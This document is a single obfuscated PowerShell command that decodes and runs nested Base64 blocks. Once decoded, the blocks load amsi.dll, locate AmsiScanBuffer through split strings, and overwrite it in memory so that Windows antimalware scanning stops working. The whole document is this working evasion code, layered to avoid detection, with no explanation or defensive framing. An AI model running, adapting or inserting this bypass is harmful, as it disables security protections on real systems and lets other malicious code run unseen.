iex([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("JABwADEAIAA9ACAAIgBKAEEAQgBYAEEARwBrAEEAYgBnAEEAegBBAEQASQBBAEkAQQBBADkAQQBDAEEAQQBRAEEAQQBpAEEAQQBvAEEAQwBnAEIAMQBBAEgATQBBAGEAUQBCAHUAQQBHAGMAQQBJAEEAQgBUAEEASABrAEEAYwB3AEIAMABBAEcAVQBBAGIAUQBBADcAQQBBAG8AQQBkAFEAQgB6AEEARwBrAEEAYgBnAEIAbgBBAEMAQQBBAFUAdwBCADUAQQBIAE0AQQBkAEEAQgBsAEEARwAwAEEATABnAEIAUwBBAEgAVQBBAGIAZwBCADAAQQBHAGsAQQBiAFEAQgBsAEEAQwA0AEEAUwBRAEIAdQBBAEgAUQBBAFoAUQBCAHkAQQBHADgAQQBjAEEAQgBUAEEARwBVAEEAYwBnAEIAMgBBAEcAawBBAFkAdwBCAGwAQQBIAE0AQQBPAHcAQQBLAEEAQQBvAEEAYwBBAEIAMQBBAEcASQBBAGIAQQBCAHAAQQBHAE0AQQBJAEEAQgBqAEEARwB3AEEAWQBRAEIAegBBAEgATQBBAEkAQQBCAFgAQQBHAGsAQQBiAGcAQQB6AEEARABJAEEASQBBAEIANwBBAEEAbwBBAEMAZwBBAGcAQQBDAEEAQQBJAEEAQQBnAEEARgBzAEEAUgBBAEIAcwBBAEcAdwBBAFMAUQBCAHQAQQBIAEEAQQBiAHcAQgB5AEEASABRAEEASwBBAEEAaQBBAEcAcwBBAFoAUQBCAHkAQQBHADQAQQBaAFEAQgBzAEEARABNAEEATQBnAEEAaQBBAEMAawBBAFgAUQBBAEsAQQBDAEEAQQBJAEEAQQBnAEEAQwBBAEEAYwBBAEIAMQBBAEcASQBBAGIAQQBCAHAAQQBHAE0AQQBJAEEAQgB6AEEASABRAEEAWQBRAEIAMABBAEcAawBBAFkAdwBBAGcAQQBHAFUAQQBlAEEAQgAwAEEARwBVAEEAYwBnAEIAdQBBAEMAQQBBAFMAUQBCAHUAQQBIAFEAQQBVAEEAQgAwAEEASABJAEEASQBBAEIASABBAEcAVQBBAGQAQQBCAFEAQQBIAEkAQQBiAHcAQgBqAEEARQBFAEEAWgBBAEIAawBBAEgASQBBAFoAUQBCAHoAQQBIAE0AQQBLAEEAQgBKAEEARwA0AEEAZABBAEIAUQBBAEgAUQBBAGMAZwBBAGcAQQBHAGcAQQBUAFEAQgB2AEEARwBRAEEAZABRAEIAcwBBAEcAVQBBAEwAQQBBAGcAQQBIAE0AQQBkAEEAQgB5AEEARwBrAEEAYgBnAEIAbgBBAEMAQQBBAGMAQQBCAHkAQQBHADgAQQBZAHcAQgBPAEEARwBFAEEAYgBRAEIAbABBAEMAawBBAE8AdwBBAEsAQQBBAG8AQQBJAEEAQQBnAEEAQwBBAEEASQBBAEIAYgBBAEUAUQBBAGIAQQBCAHMAQQBFAGsAQQBiAFEAQgB3AEEARwA4AEEAYwBnAEIAMABBAEMAZwBBAEkAZwBCAHIAQQBHAFUAQQBjAGcAQgB1AEEARwBVAEEAYgBBAEEAegBBAEQASQBBAEkAZwBBAHAAQQBGADAAQQBDAGcAQQBnAEEAQwBBAEEASQBBAEEAZwBBAEgAQQBBAGQAUQBCAGkAQQBHAHcAQQBhAFEAQgBqAEEAQwBBAEEAYwB3AEIAMABBAEcARQBBAGQAQQBCAHAAQQBHAE0AQQBJAEEAQgBsAEEASABnAEEAZABBAEIAbABBAEgASQBBAGIAZwBBAGcAQQBFAGsAQQBiAGcAQgAwAEEARgBBAEEAZABBAEIAeQBBAEMAQQBBAFQAQQBCAHYAQQBHAEUAQQBaAEEAQgBNAEEARwBrAEEAWQBnAEIAeQBBAEcARQBBAGMAZwBCADUAQQBDAGcAQQBjAHcAQgAwAEEASABJAEEAYQBRAEIAdQBBAEcAYwBBAEkAQQBCAHUAQQBHAEUAQQBiAFEAQgBsAEEAQwBrAEEATwB3AEEASwBBAEEAbwBBAEkAQQBBAGcAQQBDAEEAQQBJAEEAQgBiAEEARQBRAEEAYgBBAEIAcwBBAEUAawBBAGIAUQBCAHcAQQBHADgAQQBjAGcAQgAwAEEAQwBnAEEASQBnAEIAcgBBAEcAVQBBAGMAZwBCAHUAQQBHAFUAQQBiAEEAQQB6AEEARABJAEEASQBnAEEAcABBAEYAMABBAEMAZwBBAGcAQQBDAEEAQQBJAEEAQQBnAEEASABBAEEAZABRAEIAaQBBAEcAdwBBAGEAUQBCAGoAQQBDAEEAQQBjAHcAQgAwAEEARwBFAEEAZABBAEIAcABBAEcATQBBAEkAQQBCAGwAQQBIAGcAQQBkAEEAQgBsAEEASABJAEEAYgBnAEEAZwBBAEcASQBBAGIAdwBCAHYAQQBHAHcAQQBJAEEAQgBXAEEARwBrAEEAYwBnAEIAMABBAEgAVQBBAFkAUQBCAHMAQQBGAEEAQQBjAGcAQgB2AEEASABRAEEAWgBRAEIAagBBAEgAUQBBAEsAQQBCAEoAQQBHADQAQQBkAEEAQgBRAEEASABRAEEAYwBnAEEAZwBBAEcAdwBBAGMAQQBCAEIAQQBHAFEAQQBaAEEAQgB5AEEARwBVAEEAYwB3AEIAegBBAEMAdwBBAEkAQQBCAFYAQQBFAGsAQQBiAGcAQgAwAEEARgBBAEEAZABBAEIAeQBBAEMAQQBBAFoAQQBCADMAQQBGAE0AQQBhAFEAQgA2AEEARwBVAEEATABBAEEAZwBBAEgAVQBBAGEAUQBCAHUAQQBIAFEAQQBJAEEAQgBtAEEARwB3AEEAVABnAEIAbABBAEgAYwBBAFUAQQBCAHkAQQBHADgAQQBkAEEAQgBsAEEARwBNAEEAZABBAEEAcwBBAEMAQQBBAGIAdwBCADEAQQBIAFEAQQBJAEEAQgAxAEEARwBrAEEAYgBnAEIAMABBAEMAQQBBAGIAQQBCAHcAQQBHAFkAQQBiAEEAQgBQAEEARwB3AEEAWgBBAEIAUQBBAEgASQBBAGIAdwBCADAAQQBHAFUAQQBZAHcAQgAwAEEAQwBrAEEATwB3AEEASwBBAEEAbwBBAGYAUQBBAEsAQQBDAEkAQQBRAEEAQQA9ACIAOwAKACQAcAAyACAAPQAgACIAUQBRAEIAawBBAEcAUQBBAEwAUQBCAFUAQQBIAGsAQQBjAEEAQgBsAEEAQwBBAEEASgBBAEIAWABBAEcAawBBAGIAZwBBAHoAQQBEAEkAQQBDAGcAQQBrAEEARQB3AEEAYgB3AEIAaABBAEcAUQBBAFQAQQBCAHAAQQBHAEkAQQBjAGcAQgBoAEEASABJAEEAZQBRAEEAZwBBAEQAMABBAEkAQQBCAGIAQQBGAGMAQQBhAFEAQgB1AEEARABNAEEATQBnAEIAZABBAEQAbwBBAE8AZwBCAE0AQQBHADgAQQBZAFEAQgBrAEEARQB3AEEAYQBRAEIAaQBBAEgASQBBAFkAUQBCAHkAQQBIAGsAQQBLAEEAQQBpAEEARwBFAEEAYgBRAEEAaQBBAEMAQQBBAEsAdwBBAGcAQQBDAEkAQQBjAHcAQgBwAEEAQwA0AEEAWgBBAEEAaQBBAEMAcwBBAEkAZwBCAHMAQQBHAHcAQQBJAGcAQQBwAEEAQQBvAEEASgBBAEIAQgBBAEcAUQBBAFoAQQBCAHkAQQBHAFUAQQBjAHcAQgB6AEEAQwBBAEEAUABRAEEAZwBBAEYAcwBBAFYAdwBCAHAAQQBHADQAQQBNAHcAQQB5AEEARgAwAEEATwBnAEEANgBBAEUAYwBBAFoAUQBCADAAQQBGAEEAQQBjAGcAQgB2AEEARwBNAEEAUQBRAEIAawBBAEcAUQBBAGMAZwBCAGwAQQBIAE0AQQBjAHcAQQBvAEEAQwBRAEEAVABBAEIAdgBBAEcARQBBAFoAQQBCAE0AQQBHAGsAQQBZAGcAQgB5AEEARwBFAEEAYwBnAEIANQBBAEMAdwBBAEkAQQBBAGkAQQBFAEUAQQBiAFEAQQBpAEEAQwBzAEEASQBnAEIAegBBAEcAawBBAEkAZwBBAGcAQQBDAHMAQQBJAEEAQQBpAEEARgBNAEEAWQB3AEEAaQBBAEMAcwBBAEkAZwBCAGgAQQBHADQAQQBJAGcAQQBnAEEAQwBzAEEASQBBAEEAaQBBAEUASQBBAGQAUQBCAG0AQQBDAEkAQQBLAHcAQQBpAEEARwBZAEEAWgBRAEIAeQBBAEMASQBBAEsAUQBBAD0AIgA7AAoAJABwADMAIAA9ACAAIgBKAEEAQgB3AEEAQwBBAEEAUABRAEEAZwBBAEQAQQBBAEMAZwBCAGIAQQBGAGMAQQBhAFEAQgB1AEEARABNAEEATQBnAEIAZABBAEQAbwBBAE8AZwBCAFcAQQBHAGsAQQBjAGcAQgAwAEEASABVAEEAWQBRAEIAcwBBAEYAQQBBAGMAZwBCAHYAQQBIAFEAQQBaAFEAQgBqAEEASABRAEEASwBBAEEAawBBAEUARQBBAFoAQQBCAGsAQQBIAEkAQQBaAFEAQgB6AEEASABNAEEATABBAEEAZwBBAEYAcwBBAGQAUQBCAHAAQQBHADQAQQBkAEEAQQB6AEEARABJAEEAWABRAEEAMQBBAEMAdwBBAEkAQQBBAHcAQQBIAGcAQQBOAEEAQQB3AEEAQwB3AEEASQBBAEIAYgBBAEgASQBBAFoAUQBCAG0AQQBGADAAQQBKAEEAQgB3AEEAQwBrAEEAQwBnAEEAawBBAEYAQQBBAFkAUQBCADAAQQBHAE0AQQBhAEEAQQBnAEEARAAwAEEASQBBAEIAYgBBAEUASQBBAGUAUQBCADAAQQBHAFUAQQBXAHcAQgBkAEEARgAwAEEASQBBAEEAbwBBAEQAQQBBAGUAQQBCAEMAQQBEAGcAQQBMAEEAQQBnAEEARABBAEEAZQBBAEEAMQBBAEQAYwBBAEwAQQBBAGcAQQBEAEEAQQBMAEEAQQBnAEEARABBAEEAZQBBAEEAdwBBAEQAYwBBAEwAQQBBAGcAQQBEAEEAQQBlAEEAQQA0AEEARABBAEEATABBAEEAZwBBAEQARQBBAE8AUQBBADEAQQBDAGsAQQAiADsACgAkAHAANAAgAD0AIAAiAEoAQQBCAGoAQQBHAGsAQQBiAGcAQgBrAEEARwBVAEEAYwBnAEIAbABBAEcAdwBBAGIAQQBCAGgAQQBDAEEAQQBQAFEAQQBnAEEAQwBjAEEAUQB3AEIAdgBBAEgAQQBBAGUAUQBBAG8AQQBDAFEAQQBVAEEAQgBoAEEASABRAEEAWQB3AEIAbwBBAEMAdwBBAEkAQQBBAHcAQQBDAHcAQQBKAHcAQQBLAEEARwBrAEEAWgBRAEIANABBAEMAZwBBAEkAZwBCAGIAQQBGAE0AQQBlAFEAQgB6AEEASABRAEEAWgBRAEIAdABBAEMANABBAFUAZwBCADEAQQBHADQAQQBkAEEAQgBwAEEARwAwAEEAWgBRAEEAdQBBAEUAawBBAGIAZwBCADAAQQBHAFUAQQBjAGcAQgB2AEEASABBAEEAVQB3AEIAbABBAEgASQBBAGQAZwBCAHAAQQBHAE0AQQBaAFEAQgB6AEEAQwA0AEEAVABRAEIAaABBAEgASQBBAGMAdwBCAG8AQQBHAEUAQQBiAEEAQgBkAEEARABvAEEATwBnAEEAaQBBAEMAcwBBAEoAQQBCAGoAQQBHAGsAQQBiAGcAQgBrAEEARwBVAEEAYwBnAEIAbABBAEcAdwBBAGIAQQBCAGgAQQBDAHMAQQBJAGcAQQBrAEEARQBFAEEAWgBBAEIAawBBAEgASQBBAFoAUQBCAHoAQQBIAE0AQQBMAEEAQQBnAEEARABZAEEASwBRAEEAaQBBAEMAawBBAEMAZwBBAD0AIgA7AAoAaQBlAHgAKABbAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBVAG4AaQBjAG8AZABlAC4ARwBlAHQAUwB0AHIAaQBuAGcAKABbAFMAeQBzAHQAZQBtAC4AQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAJABwADEAKQApACkAOwAKAGkAZQB4ACgAWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBuAGkAYwBvAGQAZQAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACQAcAAyACkAKQApADsACgBpAGUAeAAoAFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAbgBpAGMAbwBkAGUALgBHAGUAdABTAHQAcgBpAG4AZwAoAFsAUwB5AHMAdABlAG0ALgBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAkAHAAMwApACkAKQA7AAoAaQBlAHgAKABbAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBVAG4AaQBjAG8AZABlAC4ARwBlAHQAUwB0AHIAaQBuAGcAKABbAFMAeQBzAHQAZQBtAC4AQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAJABwADQAKQApACkAOwA=")))
